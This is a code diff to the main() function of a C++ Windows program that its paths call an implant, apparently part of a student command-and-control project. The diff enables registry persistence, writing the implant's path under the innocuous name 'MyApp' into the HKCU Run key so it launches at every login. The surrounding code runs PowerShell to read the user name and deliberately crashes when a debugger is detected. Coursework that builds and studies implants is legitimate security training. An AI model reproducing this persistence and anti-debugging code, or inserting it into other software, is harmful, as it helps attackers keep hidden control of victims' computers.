@@ -36,20 +36,23 @@ std::string get_privilege_info(){
 }
 
 int main(){
-
+//MessageBoxA(NULL,NULL,NULL,MB_YESNO);
 Sleep(100);
 std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
 std::string username = runPowershellCommand(username_cmd);
 std::cout << username << std::endl;
-//exit(1);
-// LPCSTR progPath = "C:\\Users\\vagrant\\AppData\\Roaming\\Microsoft\\Windows\\Desktop\\C2-CS501\\implant.exe";
-// HKEY hkey = NULL;
-// LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+LPCSTR progPath = "C:\\Users\\vagrant\\Desktop\\C2-CS501\\implant\\bin\\main_implant.exe";
+HKEY hkey = NULL;
+LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 
-// LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,path,&hkey); //Creates a key       
-// LPCSTR name = "MyApp";
-// LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
+LONG createStatus = RegCreateKey(HKEY_CURRENT_USER,path,&hkey); //Creates a key       
+LPCSTR name = "MyApp";
+LONG status = RegSetValueEx(hkey,name, 0, REG_SZ, (BYTE*)progPath, 100 * sizeof(char));
+if(status == ERROR_SUCCESS){
+    std::cout << "Done" << std::endl;
+}
+exit(1);
     if(IsDebuggerPresent()){
         int *ptr = NULL;
         *ptr = 0;
